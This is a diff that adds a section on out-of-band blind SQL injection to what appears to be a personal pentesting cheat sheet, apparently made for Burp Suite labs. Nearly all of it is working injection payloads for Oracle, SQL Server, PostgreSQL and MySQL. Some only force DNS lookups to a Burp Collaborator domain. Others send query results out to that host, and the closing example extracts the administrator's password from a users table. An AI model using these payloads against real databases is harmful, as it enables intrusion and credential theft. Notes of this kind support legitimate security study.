@@ -289,3 +289,51 @@ c. Out-of-band:
         * resource pool custom: 1 or options: request engine(no. of threads=1) 
 
   gyftm8e4w60ujeaex093
+
+
+***** Blind SQLI with out-of band *****
+
+1. Check if it sends DNS request to burpsuite.
+
+        Oracle:
+                SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
+                SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')
+
+        Microsoft:
+        	exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
+
+        PostgreSQL:
+         	copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
+
+        MySQL:
+                LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
+                SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
+
+
+        eg: ' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://re9esjd1431tz265wlpkn84g97fx3m.burpcollaborator.net"> %remote;]>'),'/l') FROM dual) --
+
+2. Data exfiltration 
+
+        Oracle:
+         	SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
+
+        Microsoft:
+         	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')
+
+        PostgreSQL:
+        	create OR replace function f() returns void as $$
+                declare c text;
+                declare p text;
+                begin
+                SELECT into p (SELECT YOUR-QUERY-HERE);
+                c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';
+                execute c;
+                END;
+                $$ language plpgsql security definer;
+                SELECT f();
+
+        MySQL:
+                SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
+
+
+        eg: ' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.ezhh7c1hmq52buph7dsozfbs1j7bv0.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--
